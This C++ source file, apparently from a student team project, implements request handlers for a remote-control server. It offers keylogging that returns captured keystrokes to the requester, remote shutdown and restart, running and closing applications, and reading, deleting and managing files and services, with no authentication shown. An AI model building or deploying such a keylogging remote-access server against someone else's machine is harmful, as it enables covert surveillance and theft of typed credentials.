#include "Server.h"
#include "App.h"
#include "KeyLogger.h"
#include "File.h"
#include "Service.h"

bool Server::keylog(Request& request, Response &response) {
    static KeyLogger keylog;

    string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");
    
    if (subaction == "Start") {
        cout << "Started keylogger\n";
        keylog.startKeylogger(); 
    } else if (subaction == "Stop") {
        cout << "Stopped keylogger\n";
        keylog.stopKeylogger();

        ifstream fin = keylog.getLoggingStream();
        string content; 
        string buf;
        while (getline(fin, buf)) {
            content += buf + "\n"; 
        }
        fin.close();
    
        response.putParam(kBody, content);
    }  

    return true;
}

bool Server::handleShutdownSystem(Request& request, Response &response){
    App app;
    app.shutdownSystem();
    response.putParam(kStatus, "Shutdown initiated");
    return true;
}
bool Server::handleRestartSystem(Request& request, Response &response){
    App app;
    app.restartSystem();
    response.putParam(kStatus, "Restart initiated");
    return true;
}

bool Server::listRunningApps(Request& request, Response &response){
    App app;
    std::vector<std::string> appList = app.getRunningTaskbarApps();
    std::string appList_str = "Running Application: \n";
    for (int i = 0; i < appList.size(); i++){
        appList_str += std::to_string(i + 1) + ". " + appList[i] + "\n";
    }
    response.putParam(kBody, appList_str);
    return true;
}

bool Server::closeApp(Request& request, Response& response){
    App app;
    std::vector<std::string> appList = app.getRunningTaskbarApps();

    int appIndex = std::stoi(request.getParam("AppIndex"));
    if (appIndex <= 0 || appIndex > appList.size()){
        response.putParam(kStatus, "Invalid index");
        return false;
    }
    std::string appName = appList[appIndex - 1];
    bool success = app.closeApplication(appName);
    response.putParam(kStatus, success ? "Closed" : "Failed to close");
    return true;
}

bool Server::listInstalledApps(Request& request, Response& response){
    App app;
    std::vector<AppInfo> appList = app.getInstalledApps();
    std::string appList_str = "Installed application: \n";
    for (int i = 0; i < appList.size(); i++){
        appList_str += std::to_string(i + 1) + ". " + appList[i].name + "\n";
    }
    response.putParam(kBody, appList_str);
    return true;
}

bool Server::runApp(Request& request, Response &response){
    App app;
    std::vector<AppInfo> appList = app.getInstalledApps();

    int appIndex = std::stoi(request.getParam("AppIndex"));
    if (appIndex <= 0 || appIndex > appList.size()){
        response.putParam(kStatus, "Invalid index");
        return false;
    }
    std::string appPath = appList[appIndex - 1].fullpath;
    bool success = app.runApplication(appPath);
    response.putParam(kBody, success ? "App is running" : "Failed to run");
    return true;
}

bool Server::handleApp(Request& request, Response& response){
    std::string subAction = request.getParam(kSubAction);
    if (subAction == "listrunningapps")
        return listRunningApps(request, response);
    else if (subAction == "closeapp")
        return closeApp(request, response);
    else if (subAction == "listinstalledapps")
        return listInstalledApps(request, response);
    else if (subAction == "runapp")
        return runApp(request, response);
    else{
        response.putParam(kStatus, "Invalid subaction");
        return false;
    }
}


// Thang : File & Service
// ---Start---
bool handleGetFile(Request& request, Response& response){
    File file;
    string file_name = request.getParam(kFilePrefix + "tmt.txt"); // Thêm dùm tui khúc này nha Thịnh
    string file_content = file.readFile(file_name);
    response.putParam(kBody, file_content);
    return true;
    
}

bool handleDeleteFile(Request& request, Response& response){
    File file;
    string file_name = request.getParam(kFilePrefix + "tmt.txt"); // Thêm dùm tui khúc này nha Thịnh
    file.deleteFile(file_name);
    response.putParam(kStatus, "Deleted File");
    return true;
}

bool listRunningService(Request& request, Response& response){
    Service service;
    string list_service = service.listRunningServices();
    response.putParam(kBody, list_service);
    return true;
}

bool handleStartService(Request& request, Response& response){
    Service service;
    string name_service = request.getParam(kSubAction);
    service.StartServiceByName(name_service);
    response.putParam(kStatus, "Started service");
    return true;
}

bool handleStopService(Request& request, Response& response){
    Service service;
    string name_service = request.getParam(kSubAction);
    service.StopServiceByName(name_service);
    response.putParam(kStatus, "Stopped service");
    return true;
}
// ---End--- (File & Service)

bool Server::processRequest(Request& request, Response &response) {
    cout << "Processing Request\n" << request << "\n";
    response.setAction(request.getAction());
    response.getParams().clear();
    
    switch (request.getAction()) {
        case ACTION_KEYLOG:
            return keylog(request, response);
        case ACTION_SHUTDOWN:
            return handleShutdownSystem(request, response);
        case ACTION_RESTART:
            return handleRestartSystem(request, response);
        case ACTION_APP:
            return handleApp(request, response);
        default:
            return false;
    }
}